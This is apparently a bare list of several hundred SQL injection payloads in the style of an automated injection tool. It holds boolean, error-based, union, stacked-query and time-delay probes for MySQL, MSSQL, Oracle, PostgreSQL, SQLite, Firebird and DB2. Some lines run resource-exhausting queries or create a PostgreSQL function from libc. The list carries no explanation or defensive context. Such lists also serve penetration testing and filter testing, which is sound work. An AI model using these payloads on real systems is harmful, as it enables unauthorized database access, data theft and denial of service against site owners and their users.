+1') rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ('ejnt' like 'ejnt
+1') union all select null,null,null,null,null,null#
+1'||(select 'bupa' from dual where 8548=8548;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--
+1')) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('zcrh'='zcrh
+-3472' or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))
+1) where 6424=6424;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--
+1) as rnfb where 2405=2405 or 8514=benchmark(5000000,md5(0x544d5a4c))#
+1')) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('esma' like 'esma
+1' where 1844=1844;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#
+1";select benchmark(5000000,md5(0x714e4153))#
+1")) as esho where 8864=8864 order by 1--
+1) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (5130=5130
+1%' and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and '%'='
+-7731")) or make_set(2551=4389,4389) and (("unly" like "unly
+-3169" order by 1#
+1));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--
+1');select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('dthp'='dthp
+1") where 2834=2834 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--
+1 and 4595=4595#
+1 where 3354=3354;begin user_lock.sleep(5); end--
+1'||(select 'sdll' where 5074=5074 or (select * from (select(sleep(5)))ydpu))||'
+1') as yxdb where 4597=4597;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--
+1;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5-- mkoo
+1%") and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ("%"="
+-2377%'))) union all select 7706,7706--
+1") and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ("rphs"="rphs
+1") where 1699=1699 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+1 where 6827=6827;select case when 7717=7717 then 1 else null end--
+1"))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((("tkkg"="tkkg
+1" (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and "cbck" like "cbck
+1 and elt(1210=1210,sleep(5))-- ommf
+1')) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (('ayqn' like 'ayqn
+1') as vmmk where 5757=5757 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+1 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)-- mtaq
+1%")) union all select null,null,null,null,null,null,null,null,null#
+-2321%") or 2271=7683--
+-3604') as fyev where 7259=7259 union all select 7259,7259,7259,7259--
+-6039%')) or 6872=6872 and (('%'='
+-3794') union all select 2485,2485,2485,2485,2485--
+1'||(select 'awic' where 5227=5227;begin dbms_lock.sleep(5); end--
+1) as iovi where 3910=3910 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--
+-6431' or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'ixix' like 'ixix
+1%'))) and 3824=benchmark(5000000,md5(0x76555642)) and ((('%'='
+1%" and elt(5345=8751,8751) and "%"="
+1%" union all select null,null--
+-6733') where 4024=4024 union all select 4024,4024,4024,4024#
+1%"))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((("%"="
+1)) or elt(6272=6272,sleep(5)) and ((8024=8024
+1';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--
+1') or sleep(5)#
+1' where 8635=8635 order by 1--
+-7448 union all select 4072,4072#
+1));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--
+1'));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--
+-4168') union all select 2618,2618#
+1")) as mlid where 1047=1047 union all select null,null#
+1' where 1272=1272 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--
+1' in boolean mode) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)#
+1) as nkjo where 8462=8462 union all select null,null,null,null,null,null,null,null,null--
+1";select count(*) from generate_series(1,5000000) and "ihbe" like "ihbe
+1") and sleep(5)#
+1);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (8535=8535
+1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)
+-4947' order by 1#
+-8612'+(select 'iqla' where 5035=5035 union all select 5035,5035,5035,5035,5035,5035,5035#
+1'||(select 'vekn' from dual where 4929=4929 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5))||'
+1%" and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and "%"="
+1") as ltoa where 9159=9159 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--
+-1064' or make_set(6439=2937,2937) and 'qojd'='qojd
+1"))) waitfor delay '0:0:5' and ((("ckht"="ckht
+-7742) as tgzq where 7842=7842 or 2062=1563
+1')) as umah where 3781=3781 union all select null,null,null,null#
+-4889")) as vvuo where 8060=8060 or (8459=8459)*4906--
+-7887') union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#
+1" and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+1') and 4822=6997 and ('ojku'='ojku
+1) as uuro where 6784=6784;if(7899=7899) select 7899 else drop function zbbp--
+1' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'lywy' like 'lywy
+-7088'||(select 'arol' from dual where 8891=8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#
+1')) as hpta where 5376=5376 waitfor delay '0:0:5'--
+-1050")) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (("orfo" like "orfo
+-5657'))) union all select 8071,8071,8071,8071,8071,8071,8071,8071#
+1%'));select case when 3920=4402 then 1 else null end--
+1'+(select tnch where 1867=1867 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'
+1)) and make_set(8554=3286,3286) and ((7385=7385
+-3750'+(select alpu where 3911=3911 order by 1--
+-8266%') union all select 8626,8626,8626,8626,8626,8626--
+-3737%" union all select 4452,4452,4452#
+-5247" union all select 3097,3097,3097,3097,3097,3097,3097#
+-3581'||(select 'uxmh' from dual where 8954=8954 union all select 8954,8954,8954,8954,8954,8954#
+1 waitfor delay '0:0:5'
+-6595" order by 1--
+1%") or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ("%"="
+1");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ("qwdi"="qwdi
+1%';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and '%'='
+1'+(select sfuq where 8094=8094 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1))+'
+1))) union all select null,null,null,null,null,null,null,null--
+1";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)
+-6550') where 1675=1675 union all select 1675,1675,1675,1675,1675,1675,1675--
+1'||(select 'gved' from dual where 6965=6965;waitfor delay '0:0:5')||'
+1',(select (case when (8596=8596) then 1 else 8596*(select 8596 from mysql.db) end))
+1',(case when 5204=2136 then 1 else null end)
+1) as wuio where 5312=5312 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
+1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))
+1%")));select (case when (5290=1720) then 5290 else 1/(select 0) end)--
+1' or elt(6272=6272,sleep(5)) and 'wdoi'='wdoi
+1' union all select null,null,null,null,null--
+1')));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--
+1) as rbmn where 5948=5948 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1')) as nuku where 7009=7009 union all select null,null,null,null,null#
+1%') rlike (select * from (select(sleep(5)))sgvo) and ('%'='
+1' in boolean mode);select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--
+1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)
+1;waitfor delay '0:0:5'# ogzq
+1'+(select ounb where 4653=4653 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)))+'
+1');select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--
+1'+(select 'kcix' where 1117=1117;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--
+1") where 5196=5196 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--
+1'))) or 8466=benchmark(5000000,md5(0x694a4745)) and ((('tpeo' like 'tpeo
+-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--
+1')) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('nuis'='nuis
+-1600%"))) or elt(4568=7693,7693) and ((("%"="
+1) where 4810=4810 union all select null,null#
+1";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5
+1'+(select 'bztp' where 2541=2541 union all select null,null,null,null,null,null,null,null,null,null--
+-1436' or 5699=5783--
+1") rlike (select * from (select(sleep(5)))sgvo) and ("fkmh"="fkmh
+1")) as upvg where 4826=4826;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+-3749" or elt(1032=1032,3623) and "mzrw"="mzrw
+1%' and 9198=9198--
+1" and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--
+-8248 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')
+1'+(select 'qxmo' where 9511=9511 rlike (select * from (select(sleep(5)))vwyq)#
+1') where 9159=9159;iif(3548=8646,1,1/0)
+1 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))
+-8071)) or 9160=4253
+1")) and 8329=5584#
+-2849' union all select 6491,6491,6491,6491,6491,6491,6491--
+1%'));iif(5257=5257,1,1/0)
+1')) or 8156=(select count(*) from generate_series(1,5000000))--
+1' in boolean mode);waitfor delay '0:0:5'--
+1) as ktfu where 2637=2637;call regexp_substring(repeat(right(char(2385),0),500000000),null)--
+-5204") union all select 7186,7186,7186--
+1')) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--
+-1269" union all select 8412,8412,8412,8412,8412,8412,8412,8412--
+1 where 2649=2649 or (select * from (select(sleep(5)))ydpu)--
+1');if(2697=2008) select 2697 else drop function jcoo--
+1) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--
+1') waitfor delay '0:0:5'--
+1 where 7425=7425 rlike (select (case when (4056=3196) then 1 else 0x28 end))--
+1)));begin user_lock.sleep(5); end and (((3673=3673
+1'));select (case when (9667=6212) then 9667 else cast(1 as int)/(select 0 from dual) end) from dual--
+1'||(select 'gbyh' from dual where 5889=5889 order by 1#
+-1543%' union all select 9341,9341,9341,9341,9341,9341,9341,9341,9341--
+1')) and 8594=(select 8594 from pg_sleep(5))--
+1%")));select sleep(5) and ((("%"="
+-8203") union all select 6394,6394,6394,6394,6394--
+1') as jrwx where 6087=6087 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--
+1")) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (("uglh" like "uglh
+1'))) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+1' where 7828=7828 or 4240=(select 4240 from pg_sleep(5))--
+1') and elt(7554=6257,6257) and ('bpzm'='bpzm
+1%") and 8626=3626#
+1")) as hfma where 2654=2654 and make_set(8403=8403,8899)--
+1%' or sleep(5) and '%'='
+-5245"))) union all select 8106,8106,8106#
+1 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)# hlrg
+1)) as beld where 1679=1679 or sleep(5)#
+1%'))) and 7219=7361 and ((('%'='
+1'||(select 'wszt' from dual where 6854=6854 and 6969=(select 6969 from pg_sleep(5)))||'
+-6965') union all select 2857,2857,2857,2857,2857,2857,2857,2857,2857,2857--
+1,(select (case when (2106=2106) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else 2106*(select 2106 from master..sysdatabases) end))
+1")) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (("qyew"="qyew
+1) and 8635=(select count(*) from generate_series(1,5000000))--
+1'||(select 'ptfi' from dual where 2234=2234 and 2006=2006
+1',(select (case when (6560=2813) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)
+1' and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--
+1") as hhxx where 3372=3372 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+-7119") or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ("rmzm"="rmzm
+-3805"))) union all select 9123,9123,9123,9123,9123,9123,9123,9123#
+1")) as vhrq where 1690=1690 and elt(1210=1210,sleep(5))--
+1) as fhvr where 5544=5544;iif(5257=5257,1,1/0)
+1 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)
+1'||(select 'qdkb' where 4331=4331;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'
+1))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((1402=1402
+1');select count(*) from generate_series(1,5000000)
+-4896') union all select 1929--
+1" and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))
+-5764 or 3038=3038
+1")) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (("xqlh"="xqlh
+1));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--
+1 where 1568=1568 or (select * from (select(sleep(5)))sddo)#
+1' in boolean mode) and 5725=5552#
+-7382')) or make_set(9425=4330,4330) and (('tvaz' like 'tvaz
+1")) or (select * from (select(sleep(5)))sddo)#
+1%'))) union all select null,null,null,null,null--
+-9558" where 7497=7497 or (2539=6484)*6484--
+1) where 3381=3381 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--
+1%')) rlike (select * from (select(sleep(5)))sgvo) and (('%'='
+1' where 7014=7014 or 8466=benchmark(5000000,md5(0x694a4745))--
+1') as tygi where 9891=9891 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--
+1 and 6969=(select 6969 from pg_sleep(5))
+1%') and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--
+1") or elt(5873=5873,sleep(5))#
+1'+(select qdon where 9453=9453;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'
+-7350'))) union all select 9207,9207,9207,9207--
+1%')));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--
+-7950') or 9323=9323#
+1') as ssxj where 3845=3845 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--
+-6222)) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((3230=3230
+1%" or 6793=(select 6793 from pg_sleep(5)) and "%"="
+-8684' where 9820=9820 or 6844=5105
+1) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))
+1%")) or elt(6272=6272,sleep(5)) and (("%"="
+1 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))# hkrp
+1' where 4334=4334 or elt(5873=5873,sleep(5))#
+1') as bfgl where 8959=8959 union all select null,null,null,null,null,null,null,null,null,null--
+-1376%"))) or 3458=9503 and ((("%"="
+1" where 1852=1852 union all select null,null,null,null,null,null,null,null,null#
+1')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((('iwwa' like 'iwwa
+1") as lipa where 3450=3450 and make_set(8403=8403,8899)--
+-1687)) as lnva where 8396=8396 union all select 8396,8396#
+-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--
+1));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#
+-5109))) or make_set(6627=7331,7331) and (((9466=9466
+1') as lewd where 3118=3118 order by 1--
+1" rlike (select (case when (7689=7689) then 1 else 0x28 end)) and "tbbk" like "tbbk
+1%");waitfor delay '0:0:5' and ("%"="
+1%") or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+1" where 7245=7245 and 9198=9198--
+1%") union all select null,null,null,null,null--
+-5534 or 1983=5721#
+1')) and make_set(8403=8403,8899) and (('bmsa'='bmsa
+1")) as riui where 2605=2605;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--
+1%'))) waitfor delay '0:0:5' and ((('%'='
+1') where 5616=5616;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--
+-1648)) as oqqy where 3459=3459 or 6872=6872--
+1' or (select * from (select(sleep(5)))ydpu) and 'iwmy'='iwmy
+1) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (3872=3872
+1%"))) or 8514=benchmark(5000000,md5(0x544d5a4c))#
+1')) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('fowu' like 'fowu
+1%");select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#
+(select (case when (1938=1938) then dbms_pipe.receive_message(chr(118)||chr(118)||chr(112)||chr(76),5) else 1938 end) from dual)
+-8054')) union all select 5232,5232,5232,5232,5232,5232,5232#
+-9037%" union all select 6583#
+1'+(select bruk where 1400=1400 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1))+'
+1') and 2564=3234--
+-9005 union all select 4410#
+1'||(select 'fcnb' where 2869=2869 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))||'
+-1583') or elt(1032=1032,3623) and ('jrcj' like 'jrcj
+1'))) and 7533=7533 and ((('txex'='txex
+1" where 9669=9669;select sleep(5)--
+-4830"))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((("dyut"="dyut
+-8893) union all select 7594,7594,7594,7594,7594,7594#
+-1591 where 3291=3291 union all select 3291,3291,3291,3291,3291,3291,3291,3291,3291#
+1;call regexp_substring(repeat(right(char(3702),0),500000000),null)
+1) where 5012=5012 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--
+1') and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('zspf'='zspf
+1) where 8630=8630 union all select null,null--
+1")) or 8466=benchmark(5000000,md5(0x694a4745)) and (("iuxs" like "iuxs
+1"))) and 2388=benchmark(5000000,md5(0x6d457153))#
+-4684) as uqjn where 4550=4550 or 1689=5825
+-7111' or (8459=8459)*4906
+1 and 2006=2006
+1) as lvfu where 5831=5831 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--
+1"))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((("buwe"="buwe
+1' rlike (select * from (select(sleep(5)))sgvo)
+1")) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (("vjvz" like "vjvz
+1' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'vgro' like 'vgro
+-8325)) as ajxq where 6630=6630 union all select 6630,6630,6630,6630,6630,6630--
+1')) union all select null,null,null,null,null,null,null,null#
+1'+(select xwcl where 7997=7997;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--
+-8911%' or 9323=9323#
+1");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--
+-4406%' union all select 9599,9599,9599,9599#
+1'))) and sleep(5) and ((('vbck' like 'vbck
+1 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)-- dtha
+1")) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (("dbxi" like "dbxi
+1' where 4460=4460;call regexp_substring(repeat(right(char(2385),0),500000000),null)--
+-3177')) union all select 6500,6500,6500,6500,6500,6500,6500,6500,6500--
+1" and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and "ygzq" like "ygzq
+1'))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('fzgy'='fzgy
+1') where 2208=2208 rlike sleep(5)#
+1" and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--
+1')) as popm where 6594=6594 union all select null,null#
+1%')));select benchmark(5000000,md5(0x4c4d6142)) and ((('%'='
+1'))) and 9198=9198--
+1"));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (("vfvh"="vfvh
+1)) as zdbj where 2300=2300 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--
+1);select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--
+1 union all select null,null,null,null,null,null,null,null--
+-4173') or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('jdwt' like 'jdwt
+1 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)-- bqxe
+1%"));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--
+-9944")) or 8537=2039 and (("kfzj"="kfzj
+1") where 2445=2445;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--
+1 where 8532=8532;select (case when (3855=3855) then 3855 else 1/(select 0) end)--
+1'||(select 'kgjk' where 3530=3530 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+-9837" where 7201=7201 union all select 7201,7201,7201--
+1";select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and "hjxh"="hjxh
+1") and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ("ikaf" like "ikaf
+1")) as tgwp where 9405=9405;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--
+1));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((3127=3127
+-8312%")) union all select 4972--
+1" where 3227=3227 waitfor delay '0:0:5'--
+1"))) union all select null,null,null,null,null,null,null,null--
+1" where 5098=5098 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--
+-9884') or elt(1942=8409,8409) and ('tqdq' like 'tqdq
+-2125")) or 8571=8571--
+-9718%") union all select 9515,9515,9515#
+1") where 7723=7723 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--
+1") as vqkz where 8536=8536;begin user_lock.sleep(5); end--
+1'||(select 'ywjy' where 7579=7579;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1')) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('dfxd' like 'dfxd
+1%');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ('%'='
+-1304') union all select 7639#
+1%')) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('%'='
+-8301'))) or (5708=5268)*5268 and ((('hkha'='hkha
+1'))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((('jhle' like 'jhle
+1' in boolean mode) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))#
+1%"));select (case when (3486=6373) then 3486 else 3486*(select 3486 from mysql.db) end)#
+-1890'))) or 8526=1389 and ((('ecgt'='ecgt
+-7746') union all select 1998,1998,1998,1998,1998,1998,1998,1998#
+1)) as goar where 2405=2405 and 5927=9731--
+1" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and "sckh"="sckh
+1') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)
+1%');select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('%'='
+1" where 2072=2072 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--
+-2414%") or elt(1032=1032,3623) and ("%"="
+1" or elt(5873=5873,sleep(5))#
+1") as ucex where 5148=5148 order by 1#
+1' in boolean mode) rlike (select (case when (1343=1595) then 1 else 0x28 end))#
+1" and 6637=2321
+1')) union all select null,null,null,null#
+1")) as maxe where 5883=5883 union all select null,null,null,null,null,null,null,null,null#
+-4233%") or (8459=8459)*4906 and ("%"="
+1';select benchmark(5000000,md5(0x4c4d6142))
+-3505") where 2340=2340 or 9323=9323#
+1') and (select * from (select(sleep(5)))gcrr)#
